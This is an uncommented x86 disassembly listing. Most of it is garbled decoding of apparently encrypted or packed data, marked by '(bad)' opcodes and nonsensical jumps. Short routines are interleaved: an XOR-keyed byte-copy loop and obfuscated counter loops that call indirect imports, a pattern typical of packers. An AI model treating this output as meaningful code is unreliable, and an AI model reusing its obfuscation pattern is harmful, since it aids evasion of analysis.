  4029ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029eb:	out    dx,eax
  4029ec:	ds pop edx
  4029ee:	js     0x402a5f
  4029f0:	inc    esi
  4029f1:	out    dx,eax
  4029f2:	or     al,0xee
  4029f4:	or     al,0x14
  4029f6:	mov    eax,0xddd5184a
  4029fb:	jl     0x4029d5
  4029fd:	cmp    dh,cl
  4029ff:	aad    0xd7
  402a01:	mov    ds:0xb2f14876,eax
  402a06:	push   ds
  402a07:	div    BYTE PTR ds:0x92abcf93
  402a0d:	add    BYTE PTR [ebx],al
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0x1d509880,al
  402a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a43:	push   0x557e7e0c
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a70
  402a4c:	lock out dx,eax
  402a4e:	cmp    eax,0x2d509406
  402a53:	pusha  
  402a54:	inc    esi
  402a55:	jns    0x402a7b
  402a57:	outs   dx,BYTE PTR ds:[esi]
  402a58:	cmp    eax,0x609c02ec
  402a5d:	jmp    0xcb67:0x2b9e582c
  402a64:	add    ah,BYTE PTR [edx]
  402a66:	(bad)  [ebx+eax*8-0x26]
  402a6a:	xor    DWORD PTR [esi],edi
  402a6c:	scas   eax,DWORD PTR es:[edi]
  402a6d:	xchg   esp,eax
  402a6e:	xor    BYTE PTR [ebx*1+0x78af93bd],al
  402a75:	(bad)  
  402a76:	popf   
  402a77:	(bad)  
  402a79:	fistp  DWORD PTR [eax-0x551eac6a]
  402a7f:	ins    DWORD PTR es:[edi],dx
  402a80:	jns    0x402a9c
  402a82:	mov    bh,0x8b
  402a84:	add    DWORD PTR [eax+0x5d],0x4d2d89be
  402a8b:	mov    cl,0x2c
  402a8d:	push   edx
  402a8e:	in     al,dx
  402a8f:	mov    bl,0x66
  402a91:	mov    bl,0x47
  402a93:	pop    edi
  402a94:	mov    ah,0x64
  402a96:	fisttp DWORD PTR [ebx+0xb]
  402a99:	call   0x33b16272
  402a9e:	lods   al,BYTE PTR ds:[esi]
  402a9f:	dec    eax
  402aa0:	jmp    0x968f:0xc20f5a51
  402aa7:	imul   ebx,DWORD PTR [ebp+0xaa70c34],0x45
  402aae:	add    DWORD PTR [esi+esi*1],edx
  402ab1:	sbb    ecx,DWORD PTR [edi-0x7bca2234]
  402ab7:	push   ds
  402ab8:	pop    es
  402ab9:	mov    bl,0xa4
  402abb:	aam    0x20
  402abd:	mov    esi,0x1945151a
  402ac2:	test   eax,0xde8bb37b
  402ac7:	clc    
  402ac8:	jecxz  0x402a54
  402aca:	hlt    
  402acb:	mov    al,0x2d
  402acd:	pusha  
  402ace:	inc    esp
  402acf:	outs   dx,BYTE PTR ds:[esi]
  402ad0:	cmp    eax,0xf94db4de
  402ad5:	sub    eax,0x5ef9f05f
  402ada:	popf   
  402adb:	(bad)  
  402adc:	repz mov esp,DWORD PTR [ebp+edx*4+0x62c56ef8]
  402ae4:	mov    ebx,0x13d730ae
  402ae9:	mov    ebx,0xeb3831be
  402aee:	push   ds
  402aef:	int    0x31
  402af1:	mov    ch,0x3e
  402af3:	imul   edi,DWORD PTR [ebx-0x32eb721a],0x94ebddd8
  402afd:	lods   eax,DWORD PTR ds:[esi]
  402afe:	cli    
  402aff:	jae    0x402aa8
  402b01:	ds push ds
  402b03:	mov    al,es:0x773a2bb3
  402b09:	inc    eax
  402b0a:	or     DWORD PTR [ecx+eiz*2-0x33],eax
  402b0e:	pushf  
  402b0f:	scas   eax,DWORD PTR es:[edi]
  402b10:	adc    edx,DWORD PTR [ebp+ebp*8+0xa]
  402b14:	jl     0x402af9
  402b16:	and    ebp,eax
  402b18:	dec    ebp
  402b19:	retf   
  402b1a:	jle    0x402b31
  402b1c:	mov    ds:0xf8d1e841,eax
  402b21:	mov    ah,0x14
  402b23:	mov    esp,0xc114a9b6
  402b28:	or     eax,0x3e8b7e5b
  402b2d:	cmp    ebp,esp
  402b2f:	cmp    DWORD PTR [ebp+0xb65d54a],ebp
  402b35:	add    al,BYTE PTR [edx-0x533df00c]
  402b3b:	fadd   st(3),st
  402b3d:	arpl   di,si
  402b3f:	shr    BYTE PTR [edi+0x77dff61c],0x33
  402b46:	push   edx
  402b47:	xchg   ecx,esp
  402b49:	ret    
  402b4a:	(bad)  
  402b4b:	and    eax,0xb5472da9
  402b50:	mov    ds:0x864c877d,eax
  402b55:	or     ah,bl
  402b57:	inc    ecx
  402b58:	dec    ecx
  402b59:	cmp    eax,0x6ddb7141
  402b5e:	mov    eax,0xbfe7c0d8
  402b63:	dec    ecx
  402b64:	or     DWORD PTR [edi+0x43],ebp
  402b67:	inc    edx
  402b68:	add    edi,DWORD PTR [edi-0x5ca0bc40]
  402b6e:	xchg   edi,eax
  402b6f:	ror    esp,1
  402b71:	adc    BYTE PTR [ecx+0xd9ae4c6],cl
  402b77:	xchg   esp,eax
  402b78:	out    dx,eax
  402b79:	inc    ebx
  402b7a:	stos   DWORD PTR es:[edi],eax
  402b7b:	jmp    0x402b0e
  402b7d:	inc    edi
  402b7e:	daa    
  402b7f:	iret   
  402b80:	mov    ebp,0xe510a985
  402b85:	mov    ebx,0xc95686e4
  402b8a:	mov    DWORD PTR [ebp+0x56f45cd3],ebx
  402b90:	push   0xf5d25325
  402b95:	adc    BYTE PTR [eax],al
  402b97:	lods   al,BYTE PTR ds:[esi]
  402b98:	sahf   
  402b99:	pushf  
  402b9a:	add    BYTE PTR [edi+0x1e],0xf
  402b9e:	int    0x1
  402ba0:	das    
  402ba1:	mov    edi,0xf45c0f68
  402ba6:	add    ebx,DWORD PTR [esi]
  402ba8:	jbe    0x402ba1
  402baa:	aad    0xba
  402bac:	or     BYTE PTR [ebx-0x791fd283],dl
  402bb2:	jl     0x402c09
  402bb4:	pop    ds
  402bb5:	xchg   ebx,eax
  402bb6:	sub    edi,edx
  402bb8:	shl    DWORD PTR ds:0xe2cda838,0x3d
  402bbf:	add    eax,0xf7c21813
  402bc4:	hlt    
  402bc5:	adc    eax,0x7d180850
  402bca:	shl    BYTE PTR [esi+esi*4],0x8e
  402bce:	xchg   esp,eax
  402bcf:	xchg   ecx,eax
  402bd0:	arpl   bx,ax
  402bd2:	imul   ecx,DWORD PTR [ecx-0x14],0xffffffa2
  402bd6:	lock or DWORD PTR [ecx],esi
  402bd9:	aad    0xa6
  402bdb:	add    DWORD PTR ds:0xb04f34a4,0xffffffb7
  402be2:	(bad)  
  402be3:	(bad)  
  402be4:	lods   al,BYTE PTR ds:[esi]
  402be5:	cmc    
  402be6:	jg     0x402b6c
  402be8:	mov    ds:0xaadb74e8,al
  402bed:	push   ebx
  402bee:	xor    BYTE PTR [eax],bl
  402bf0:	fisttp WORD PTR [edi+edi*4-0x51]
  402bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bf5:	cli    
  402bf6:	and    bl,bh
  402bf8:	jmp    0xa599fdb0
  402bfd:	jno    0x402be5
  402bff:	mov    cl,0x78
  402c01:	add    eax,0xa96e73b5
  402c06:	xor    DWORD PTR [ebx],eax
  402c08:	lock fs dec edi
  402c0b:	push   esp
  402c0c:	jb     0x402bd7
  402c0e:	shl    DWORD PTR [ebx-0x7e],0xa3
  402c12:	nop
  402c13:	scas   al,BYTE PTR es:[edi]
  402c14:	dec    ebp
  402c15:	hlt    
  402c16:	mov    ds:0x391e3dd1,al
  402c1b:	rcl    BYTE PTR [edi-0x70],0xb
  402c1f:	icebp  
  402c20:	sar    BYTE PTR [esi],0xe4
  402c23:	test   BYTE PTR [edx+0x3f93334],cl
  402c29:	dec    BYTE PTR [ebx-0x50f0f78b]
  402c2f:	cli    
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0xe
  402c6b:	mov    al,0x34
  402c6d:	add    DWORD PTR [edi+0xa],ecx
  402c70:	jle    0x402cf0
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402ce5
  402c77:	pop    ecx
  402c78:	dec    edx
  402c79:	add    edx,0x85c7ebab
  402c7f:	shr    DWORD PTR [edi-0x7e299686],1
  402c85:	out    dx,eax
  402c86:	push   ss
  402c87:	test   BYTE PTR [ecx],al
  402c89:	outs   dx,BYTE PTR ds:[esi]
  402c8a:	add    esp,esi
  402c8c:	(bad)  
  402c8d:	xchg   edi,eax
  402c8e:	push   es
  402c8f:	mov    edx,0x336538d5
  402c94:	int    0x69
  402c96:	leave  
  402c97:	mov    ecx,0xa575e571
  402c9c:	dec    esp
  402c9d:	dec    edx
  402c9e:	aad    0x4d
  402ca0:	scas   al,BYTE PTR es:[edi]
  402ca1:	add    BYTE PTR [esi],bh
  402ca3:	loope  0x402c85
  402ca5:	xchg   ebx,eax
  402ca6:	rcr    DWORD PTR [ebp-0x78],1
  402ca9:	leave  
  402caa:	imul   DWORD PTR [eax+eiz*2]
  402cad:	or     DWORD PTR [edx+0x4b],esi
  402cb0:	mov    dl,0x82
  402cb2:	js     0x402c5e
  402cb4:	push   0xffffffde
  402cb6:	xchg   DWORD PTR [ebx+0x2],esi
  402cb9:	mov    bh,0x8d
  402cbb:	sub    eax,0x3662b368
  402cc0:	jb     0x402ce4
  402cc2:	outs   dx,BYTE PTR ds:[esi]
  402cc3:	xlat   BYTE PTR ds:[ebx]
  402cc4:	push   0x3c
  402cc6:	jne    0x402c7c
  402cc8:	adc    DWORD PTR [ebx-0x626d5fb0],ebp
  402cce:	into   
  402ccf:	fs xchg ecx,eax
  402cd1:	xlat   BYTE PTR fs:[ebx]
  402cd3:	jbe    0x402c93
  402cd5:	mov    dl,0x62
  402cd7:	and    edx,edx
  402cd9:	fisub  WORD PTR [edi]
  402cdb:	jnp    0x402d32
  402cdd:	aaa    
  402cde:	and    DWORD PTR [edx-0x3e],ecx
  402ce1:	jecxz  0x402ca3
  402ce3:	mov    ah,0xb1
  402ce5:	jns    0x402ceb
  402ce7:	ins    DWORD PTR es:[edi],dx
  402ce8:	shr    al,0xaa
  402ceb:	jbe    0x402cc7
  402ced:	shl    esi,0x26
  402cf0:	pop    ss
  402cf1:	push   ebx
  402cf2:	push   cs
  402cf3:	cwde   
  402cf4:	jns    0x402ced
  402cf6:	xchg   ecx,eax
  402cf7:	pusha  
  402cf8:	(bad)  
  402cf9:	jb     0x402d0c
  402cfb:	aaa    
  402cfc:	data16 outs dx,BYTE PTR ds:[esi]
  402cfe:	mov    ebp,0x6f029acd
  402d03:	mov    bh,0xb5
  402d05:	pushf  
  402d06:	or     BYTE PTR [ebp+edx*4-0x4e9db7c9],al
  402d0d:	or     eax,DWORD PTR [ecx+0xa2a524a]
  402d13:	adc    BYTE PTR [esp+esi*8+0x3ba4218e],0xf1
  402d1b:	out    0x71,al
  402d1d:	in     al,dx
  402d1e:	stc    
  402d1f:	(bad)
  402d22:	fcmovbe st,st(1)
  402d24:	enter  0xaf71,0xdc
  402d28:	sahf   
  402d29:	sbb    ah,BYTE PTR [ecx-0x1c4c16a8]
  402d2f:	es xchg ebp,eax
  402d31:	push   ebx
  402d32:	std    
  402d33:	sar    DWORD PTR [eax],1
  402d35:	push   edx
  402d36:	(bad)  
  402d37:	dec    esi
  402d38:	dec    ebp
  402d39:	jmp    0x6df62176
  402d3e:	fiadd  DWORD PTR [edx+0x57be3d60]
  402d44:	pushf  
  402d45:	ja     0x402d1d
  402d47:	aas    
  402d48:	dec    eax
  402d49:	addr16 popa 
  402d4b:	inc    edx
  402d4c:	lock nop
  402d4e:	rcl    BYTE PTR [ebp-0x7b],1
  402d51:	(bad)  
  402d52:	(bad)  
  402d54:	ret    
  402d55:	fisttp WORD PTR [ecx-0xb]
  402d58:	les    edx,FWORD PTR [edi]
  402d5a:	(bad)  
  402d5b:	pop    ds
  402d5c:	test   al,0x16
  402d5e:	aad    0xfa
  402d60:	adc    BYTE PTR [edx+0x410002d5],0x15
  402d67:	rcl    BYTE PTR [eax],1
  402d69:	loop   0x402da1
  402d6b:	shl    DWORD PTR ds:0xfbb71fd9,cl
  402d71:	mov    ebp,0x8c70d61c
  402d76:	lds    ebp,FWORD PTR [ebx+0x45]
  402d79:	(bad)  
  402d7a:	xchg   esp,eax
  402d7b:	ja     0x402d84
  402d7d:	loope  0x402d58
  402d7f:	jle    0x402d37
  402d81:	xchg   esi,eax
  402d82:	push   ds
  402d83:	pop    eax
  402d84:	mov    eax,0x549bded9
  402d89:	ja     0x402dde
  402d8b:	sub    bh,BYTE PTR [ebp+0x46fcb3d7]
  402d91:	leave  
  402d92:	pop    es
  402d93:	clc    
  402d94:	dec    edi
  402d95:	dec    edi
  402d96:	push   eax
  402d97:	es pop ebp
  402d99:	pop    ss
  402d9a:	sub    DWORD PTR [edi],0x46cd8ebd
  402da0:	lock xchg esi,eax
  402da2:	mov    bl,0xe5
  402da4:	int    0x18
  402da6:	sub    ch,BYTE PTR [esi+0x62291217]
  402dac:	sbb    DWORD PTR [esi+0x3cf6e154],ecx
  402db2:	lock lods al,BYTE PTR ds:[esi]
  402db4:	jg     0x402d9c
  402db6:	or     edi,DWORD PTR [esi+edi*1]
  402db9:	fldcw  WORD PTR [eax]
  402dbb:	call   0x7030:0x493569f8
  402dc2:	cwde   
  402dc3:	push   0xffffffdc
  402dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dc6:	(bad)  
  402dc7:	mov    al,ds:0x4b61aaab
  402dcc:	(bad)  
  402dcd:	ja     0x402da0
  402dcf:	xchg   edx,eax
  402dd0:	xchg   esi,eax
  402dd1:	inc    ebx
  402dd2:	dec    esp
  402dd3:	sahf   
  402dd4:	shr    ebp,0x8f
  402dd7:	leave  
  402dd8:	retf   0xf2ae
  402ddb:	and    al,0x22
  402ddd:	fucom  st(1)
  402ddf:	in     eax,0xb1
  402de1:	xchg   ebp,eax
  402de2:	mov    esp,0xa1db5116
  402de7:	sbb    al,0xb8
  402de9:	fcmovu st,st(0)
  402deb:	add    eax,0x2e7eb322
  402df0:	fisub  WORD PTR [ebx+0x3b63d5c]
  402df6:	icebp  
  402df7:	mov    ds:0x9fd596b1,al
  402dfc:	sti    
  402dfd:	xchg   edx,eax
  402dfe:	lea    ecx,[edx+0x365fbfe3]
  402e04:	sub    BYTE PTR [ebx+0xc],bh
  402e07:	inc    ebx
  402e08:	fwait
  402e09:	ret    0xc1c2
  402e0c:	out    0xfc,eax
  402e0e:	pusha  
  402e0f:	ins    BYTE PTR es:[edi],dx
  402e10:	and    eax,0x82425d4d
  402e15:	retf   0xf190
  402e18:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e1a:	in     eax,dx
  402e1b:	mov    ebx,0x605e1b34
  402e20:	xor    al,cl
  402e22:	aaa    
  402e23:	es mov dh,0x9c
  402e26:	call   0xf948bc8c
  402e2b:	ins    BYTE PTR es:[edi],dx
  402e2c:	fild   DWORD PTR [eax-0x6388d99e]
  402e32:	mov    ch,BYTE PTR ds:0x7f356926
  402e38:	sub    DWORD PTR [eax+0x673ec122],ebp
  402e3e:	test   al,0x91
  402e40:	retf   0x82b4
  402e43:	test   BYTE PTR [edi],cl
  402e45:	sub    al,0x3b
  402e47:	enter  0xb0bf,0xb7
  402e4b:	mov    esp,0x6bd72747
  402e50:	pop    es
  402e51:	add    esi,DWORD PTR [ebp+0x10]
  402e54:	cmp    edx,esi
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e650,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x4302b5
  402e91:	xor    ecx,DWORD PTR ds:0x42ec53
  402e97:	mov    DWORD PTR ds:0x4302b5,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42ec6f,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42ec6f
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42ec6f,ecx
  402ec9:	cmp    DWORD PTR ds:0x42ec6f,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42ec6f,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42e91b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ec67,0x17
  402efd:	cmp    DWORD PTR ds:0x42ec67,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ec67,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x4302c9
  402f21:	push   0x42e737
  402f26:	call   DWORD PTR ds:0x42e833
  402f2c:	cmp    DWORD PTR ds:0x42ec67,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ec67
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ec67,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ec67
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ec67,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42ec4f,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42ec4f
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42ec4f,ecx
  402f71:	cmp    DWORD PTR ds:0x42ec4f,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x4302ed
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e847
  402f8f:	cmp    DWORD PTR ds:0x42ec4f,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42ec4b,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x4302d5,0x10
  402faf:	cmp    DWORD PTR ds:0x4302d5,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x4302d5,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e6ad
  402fd4:	call   DWORD PTR ds:0x42e84b
  402fda:	cmp    DWORD PTR ds:0x4302d5,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x4302d5
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x4302d5,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x4302d5
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x4302d5,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x4302ed,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e640
  403019:	add    DWORD PTR ds:0x42ec73,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x43035b,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e648,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	mov    edx,0xa2bc6491
  403054:	or     BYTE PTR [esi+0x7e],bh
  403057:	scas   al,BYTE PTR es:[edi]
  403058:	jg     0x4030d8
  40305a:	jle    0x4030ca
  40305c:	xchg   edx,eax
  40305d:	mov    cl,0x80
  40305f:	repnz push ebp
  403061:	and    edx,ebx
  403063:	push   edi
  403064:	dec    eax
  403065:	jmp    0x4030dc
  403067:	inc    edx
  403068:	or     dl,dl
  40306a:	lods   eax,DWORD PTR ds:[esi]
  40306b:	(bad)  
  40306c:	or     al,0x2f
  40306e:	loopne 0x403093
  403070:	push   0x5a
  403072:	inc    ebp
  403073:	push   0xe6bc2c07
  403078:	mov    cl,0x76
  40307a:	sbb    BYTE PTR [eax-0x5d4573ff],bh
  403080:	dec    edx
  403081:	gs inc esp
  403083:	int    0xbc
  403085:	dec    BYTE PTR [edx-0x7f]
  403088:	mov    edi,0xebc8ec85
  40308d:	rcr    DWORD PTR ds:0x238c0066,cl
  403093:	dec    eax
  403094:	adc    eax,0xe87c51e0
  403099:	mov    cs,WORD PTR ds:0x563b5f4d
  40309f:	sub    ebx,ebx
  4030a1:	rcl    DWORD PTR [edi-0x7b],0x51
  4030a5:	cmp    bh,BYTE PTR [edi+esi*1]
  4030a8:	mov    bl,0x89
  4030aa:	push   esp
  4030ab:	push   0xffffffb6
  4030ad:	xchg   ebp,eax
  4030ae:	mov    esp,0xdb1ecbcb
  4030b3:	xor    al,0xf9
  4030b5:	nop
  4030b6:	iret   
  4030b7:	dec    esi
  4030b8:	lock xchg DWORD PTR [eax],eax
  4030bb:	sub    al,0xe5
  4030bd:	sub    eax,0x7c083c30
  4030c2:	inc    ecx
  4030c3:	xor    dh,BYTE PTR [eax+0x8531d8b]
  4030c9:	jmp    0x403142
  4030cb:	jg     0x40307b
  4030cd:	xchg   edx,eax
  4030ce:	jne    0x40310c
  4030d0:	lods   eax,DWORD PTR ds:[esi]
  4030d1:	int    0x37
  4030d3:	fcom   QWORD PTR [edi-0x56]
  4030d6:	std    
  4030d7:	mov    ebp,0x57b670a0
  4030dc:	fidiv  DWORD PTR [edi+edi*2]
  4030df:	retf   
  4030e0:	or     eax,0x7f792694
  4030e5:	add    al,0x77
  4030e7:	push   edi
  4030e8:	mov    edx,0xe474edd4
  4030ed:	clc    
  4030ee:	dec    eax
  4030ef:	sub    al,ah
  4030f1:	cmc    
  4030f2:	push   ss
  4030f3:	push   ebx
  4030f4:	mov    ebp,0xb91e0899
  4030f9:	sbb    eax,0x76d8235
  4030fe:	inc    ecx
  4030ff:	retf   0x209e
  403102:	sub    eax,0x1d639ada
  403107:	cdq    
  403108:	inc    esp
  403109:	inc    eax
  40310a:	cmp    ebp,DWORD PTR [esi+ebx*4]
  40310d:	call   0xd58b:0xbf39f0e8
  403114:	stos   BYTE PTR es:[edi],al
  403115:	or     esp,DWORD PTR [edx+0x27]
  403118:	jns    0x403107
  40311a:	inc    edx
  40311b:	mov    ecx,0x8fdc0acc
  403120:	cmp    DWORD PTR [eax-0x77ba8f50],ecx
  403126:	xchg   edx,eax
  403127:	leave  
  403128:	nop
  403129:	je     0x403166
  40312b:	or     ch,BYTE PTR [eax+eax*8-0x21d58d89]
  403132:	and    eax,0x33357d63
  403137:	mov    BYTE PTR [edi-0x8331db1],bl
  40313d:	jbe    0x4030e9
  40313f:	fs loopne 0x4030e4
  403142:	mov    eax,0x75890c8b
  403147:	enter  0x6cf3,0x3c
  40314b:	jl     0x403101
  40314d:	(bad)  
  40314e:	sub    dl,BYTE PTR [esi+0x5a5fa8bb]
  403154:	xor    ch,BYTE PTR [edi-0x12b76402]
  40315a:	call   0x912a:0x89ccd6fa
  403161:	retf   0xc9b6
  403164:	ficom  DWORD PTR [edi-0x1468a995]
  40316a:	xchg   esi,eax
  40316b:	pop    ds
  40316c:	mov    cl,0x74
  40316e:	scas   eax,DWORD PTR es:[edi]
  40316f:	mov    DWORD PTR [eax-0x79],edx
  403172:	mov    DWORD PTR [ebx+eiz*4+0xe04c83b],esi
  403179:	push   edi
  40317a:	enter  0x8e5a,0x26
  40317e:	fstp   st(7)
  403181:	retf   
  403182:	shl    BYTE PTR [ebp-0x4b],cl
  403185:	cmc    
  403186:	ret    0x880c
  403189:	dec    ebx
  40318a:	sbb    al,0xe1
  40318c:	ss call 0x6e3c:0xfc4e89bd
  403194:	scas   al,BYTE PTR es:[edi]
  403195:	ficom  DWORD PTR [edi]
  403197:	jl     0x403206
  403199:	in     eax,0x63
  40319b:	out    0x2e,al
  40319d:	xchg   esp,eax
  40319e:	inc    esi
  40319f:	mov    cl,0x45
  4031a1:	sub    al,0xe2
  4031a3:	jnp    0x4031e0
  4031a5:	add    BYTE PTR [eax+0xee4624d],0x74
  4031ac:	loope  0x4031f7
  4031ae:	int    0x43
  4031b0:	lahf   
  4031b1:	clc    
  4031b2:	jmp    0x7cec:0xc4141621
  4031b9:	in     al,0xe0
  4031bb:	mov    ecx,0xe4577a1b
  4031c0:	stc    
  4031c1:	add    eax,0xeb67adf7
  4031c6:	jo     0x40316e
  4031c8:	push   edx
  4031c9:	stos   DWORD PTR es:[edi],eax
  4031ca:	adc    al,0xee
  4031cc:	aam    0xef
  4031ce:	and    DWORD PTR [ebx-0x20d7ec2a],0x8
  4031d5:	test   al,0x35
  4031d7:	xchg   edi,eax
  4031d8:	ins    DWORD PTR es:[edi],dx
  4031d9:	mov    ecx,0x8aa0cf7d
  4031de:	mov    dl,0x95
  4031e0:	lea    ebp,[ecx-0x3eeefbc8]
  4031e6:	sub    al,0xf
  4031e8:	jbe    0x403251
  4031ea:	loopne 0x403228
  4031ec:	jl     0x403239
  4031ee:	or     ah,al
  4031f0:	sar    DWORD PTR ds:0xf678c9dd,cl
  4031f6:	out    0x85,al
  4031f8:	xor    ecx,ebx
  4031fa:	inc    ebp
  4031fb:	xchg   ebx,eax
  4031fc:	sti    
  4031fd:	add    al,0xd5
  4031ff:	fstp   DWORD PTR [eax]
  403201:	pop    ebp
  403202:	add    esp,esp
  403204:	stc    
  403205:	and    al,0x93
  403208:	je     0x403257
  40320a:	add    al,bh
  40320c:	inc    ebp
  40320d:	clc    
  40320e:	xor    DWORD PTR [ebp+0x45c7f89c],eax
  403214:	lock xor al,BYTE PTR [ebp+0xd09f89c]
  40321b:	outs   dx,DWORD PTR ds:[esi]
  40321c:	in     al,dx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42ec4b
  403229:	adc    DWORD PTR ds:0x430357,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e648,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x4302e1,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	sbb    al,0xa2
  40325e:	adc    al,0x9a
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4032b7
  403269:	mov    ss,edx
  40326b:	stc    
  40326c:	xchg   ecx,eax
  40326d:	shr    ecx,cl
  40326f:	push   edi
  403270:	xor    eax,0x8c0fa943
  403275:	popa   
  403276:	mov    dh,0x4a
  403278:	xor    al,0xfb
  40327a:	xchg   ebx,eax
  40327b:	mov    WORD PTR [edi+0x3815b9c9],gs
  403281:	mov    bh,BYTE PTR [edx+0x39]
  403284:	mov    al,ds:0x4e27ea58
  403289:	nop
  40328a:	adc    cl,BYTE PTR [edi]
  40328c:	bound  esi,QWORD PTR [esi+ebp*2]
  40328f:	int    0x49
  403291:	or     bl,BYTE PTR ds:0x65eac772
  403297:	(bad)  
  403298:	cmp    esp,DWORD PTR [ecx]
  40329a:	pushf  
  40329b:	xor    dh,BYTE PTR [ecx-0x7e]
  40329e:	fdivr  DWORD PTR [esp+ecx*4-0x27]
  4032a2:	iret   
  4032a3:	sbb    BYTE PTR [edi-0x1cd30a0a],0xf0
  4032aa:	xor    BYTE PTR [ecx-0x4e],bh
  4032ad:	dec    ecx
  4032ae:	lods   eax,DWORD PTR ds:[esi]
  4032af:	enter  0xaa56,0x20
  4032b3:	stc    
  4032b4:	(bad)  
  4032b5:	xor    esp,edx
  4032b7:	mov    ds:0x8e3edda0,eax
  4032bc:	std    
